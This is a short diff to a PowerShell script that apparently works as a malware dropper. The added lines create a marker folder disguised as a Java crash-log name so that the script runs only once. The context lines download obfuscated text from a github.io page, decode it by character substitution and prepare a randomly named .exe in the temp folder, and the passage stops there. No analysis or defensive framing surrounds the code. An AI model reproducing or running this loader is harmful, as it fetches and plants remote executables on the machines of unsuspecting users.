@@ -1,3 +1,9 @@
+$folderPath = Join-Path $PWD.Path "hs_error_pid_5986"
+# Check if folder exists
+if (Test-Path -Path $folderPath) {
+    exit
+}
+New-Item -ItemType Directory -Path $folderPath | Out-Null
 $url = "https://stinkylick.github.io/stinkylick/2/a"
 $data = (New-Object Net.WebClient).DownloadString($url) -replace '\[1\]', 'C'
 $filename = Join-Path $env:TEMP ("{0}.exe" -f [Guid]::NewGuid().ToString('N'))
